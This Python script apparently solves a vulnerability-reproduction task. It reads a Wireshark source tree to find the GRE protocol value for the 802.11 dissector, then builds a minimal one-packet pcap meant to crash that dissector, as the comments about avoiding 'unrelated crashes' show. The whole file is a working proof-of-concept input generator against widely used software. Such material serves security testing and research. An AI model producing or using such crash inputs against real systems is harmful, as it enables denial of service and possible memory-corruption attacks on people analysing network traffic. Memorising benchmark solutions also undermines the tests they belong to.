import os
import re
import struct
import tarfile
from typing import Optional, Iterable


def _read_text_from_tar_by_suffix(t: tarfile.TarFile, suffixes: Iterable[str], max_size: int = 5_000_000) -> dict:
    out = {}
    suffixes = tuple(suffixes)
    for m in t.getmembers():
        if not m.isfile():
            continue
        name = m.name
        for suf in suffixes:
            if name.endswith(suf):
                if m.size > max_size:
                    continue
                f = t.extractfile(m)
                if f is None:
                    continue
                try:
                    b = f.read()
                finally:
                    f.close()
                out[suf] = b.decode("utf-8", errors="ignore")
                break
    return out


def _read_text_from_dir_by_suffix(root: str, suffixes: Iterable[str], max_size: int = 5_000_000) -> dict:
    out = {}
    suffixes = tuple(suffixes)
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            full = os.path.join(dirpath, fn)
            try:
                st = os.stat(full)
            except OSError:
                continue
            if st.st_size > max_size:
                continue
            for suf in suffixes:
                if full.endswith(suf):
                    try:
                        with open(full, "rb") as f:
                            b = f.read()
                    except OSError:
                        continue
                    out[suf] = b.decode("utf-8", errors="ignore")
                    break
    return out


def _parse_define_numeric(text: str, name: str) -> Optional[int]:
    # Find a #define line and extract the first numeric literal (hex preferred).
    # Handles parentheses and casts loosely by scanning for 0x... or decimal.
    pattern = re.compile(r'^\s*#\s*define\s+' + re.escape(name) + r'\s+(.+)$', re.MULTILINE)
    m = pattern.search(text)
    if not m:
        return None
    rhs = m.group(1)
    rhs = rhs.split("/*", 1)[0].split("//", 1)[0].strip()
    hx = re.search(r'0x[0-9A-Fa-f]+', rhs)
    if hx:
        try:
            return int(hx.group(0), 16)
        except ValueError:
            return None
    dc = re.search(r'\b\d+\b', rhs)
    if dc:
        try:
            return int(dc.group(0), 10)
        except ValueError:
            return None
    return None


def _extract_gre_ieee80211_proto_from_packet_gre(text: str) -> Optional[int]:
    # Try to find the exact value used to register ieee80211 dissector in gre.proto.
    # Examples:
    # dissector_add_uint("gre.proto", ETHERTYPE_IEEE_802_11, ieee80211_handle);
    # dissector_add_uint("gre.proto", 0x0019, ieee80211_handle);
    lines = text.splitlines()
    for line in lines:
        if "gre.proto" not in line:
            continue
        if ("ieee80211" not in line) and ("802_11" not in line) and ("802.11" not in line) and ("wlan" not in line):
            continue
        m = re.search(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^,\s\)]+)', line)
        if not m:
            continue
        tok = m.group(1).strip()
        if tok.startswith("0x") or tok.startswith("0X"):
            try:
                return int(tok, 16)
            except ValueError:
                continue
        if tok.isdigit():
            try:
                return int(tok, 10)
            except ValueError:
                continue
    return None


def _find_ieee80211_ethertype(src_path: str) -> int:
    # Primary: ETHERTYPE_IEEE_802_11 from epan/etypes.h
    # Fallback: parse packet-gre.c registration and resolve macro.
    # Last resort: common value 0x0019
    default_val = 0x0019
    suffixes = (
        "epan/etypes.h",
        "epan/dissectors/packet-gre.c",
        "epan/dissectors/packet-gre.cxx",
        "epan/dissectors/packet-gre.cpp",
        "epan/dissectors/packet-gre.cc",
    )

    texts = {}
    if os.path.isdir(src_path):
        texts = _read_text_from_dir_by_suffix(src_path, suffixes)
    elif tarfile.is_tarfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as t:
                texts = _read_text_from_tar_by_suffix(t, suffixes)
        except Exception:
            texts = {}
    else:
        texts = {}

    etypes = texts.get("epan/etypes.h")
    if etypes:
        v = _parse_define_numeric(etypes, "ETHERTYPE_IEEE_802_11")
        if v is not None and 0 <= v <= 0xFFFF:
            return v

    packet_gre = None
    for k in ("epan/dissectors/packet-gre.c", "epan/dissectors/packet-gre.cxx", "epan/dissectors/packet-gre.cpp", "epan/dissectors/packet-gre.cc"):
        if k in texts:
            packet_gre = texts[k]
            break

    if packet_gre:
        v = _extract_gre_ieee80211_proto_from_packet_gre(packet_gre)
        if v is not None:
            if 0 <= v <= 0xFFFF:
                return v
            # If it's a macro name, attempt to resolve from etypes.h or packet-gre.c itself
            if isinstance(v, int):
                pass

        # If macro token wasn't numeric, try to extract the token and resolve it
        for line in packet_gre.splitlines():
            if "gre.proto" not in line:
                continue
            if ("ieee80211" not in line) and ("802_11" not in line) and ("802.11" not in line) and ("wlan" not in line):
                continue
            m = re.search(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^,\s\)]+)', line)
            if not m:
                continue
            tok = m.group(1).strip()
            if tok and not (tok.startswith("0x") or tok.isdigit()):
                if etypes:
                    vv = _parse_define_numeric(etypes, tok)
                    if vv is not None and 0 <= vv <= 0xFFFF:
                        return vv
                vv = _parse_define_numeric(packet_gre, tok)
                if vv is not None and 0 <= vv <= 0xFFFF:
                    return vv
            break

    return default_val


def _build_pcap_with_eth_ipv4_gre(proto_type: int, gre_payload: bytes) -> bytes:
    # pcap global header (little-endian)
    # magic: 0xa1b2c3d4 written little-endian => d4 c3 b2 a1
    pcap_global = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)  # LINKTYPE_ETHERNET=1

    # Ethernet II
    eth_dst = b"\x00\x00\x00\x00\x00\x00"
    eth_src = b"\x00\x00\x00\x00\x00\x00"
    eth_type = b"\x08\x00"  # IPv4
    eth = eth_dst + eth_src + eth_type

    # IPv4 header (no options)
    version_ihl = 0x45
    tos = 0
    total_length = 20 + 4 + len(gre_payload)
    identification = 0
    flags_frag = 0
    ttl = 64
    protocol = 47  # GRE
    hdr_checksum = 0
    src_ip = b"\x01\x01\x01\x01"
    dst_ip = b"\x02\x02\x02\x02"
    ip = struct.pack("!BBHHHBBH4s4s", version_ihl, tos, total_length, identification, flags_frag, ttl, protocol, hdr_checksum, src_ip, dst_ip)

    # GRE header: Flags+Version (0), Protocol Type
    gre = struct.pack("!HH", 0x0000, proto_type & 0xFFFF) + gre_payload

    pkt = eth + ip + gre
    pkt_hdr = struct.pack("<IIII", 0, 0, len(pkt), len(pkt))
    return pcap_global + pkt_hdr + pkt


class Solution:
    def solve(self, src_path: str) -> bytes:
        proto_80211 = _find_ieee80211_ethertype(src_path)
        # Keep payload minimal to reduce chance of unrelated crashes; must be non-empty so GRE calls subdissector.
        gre_payload = b"\x00"
        return _build_pcap_with_eth_ipv4_gre(proto_80211, gre_payload)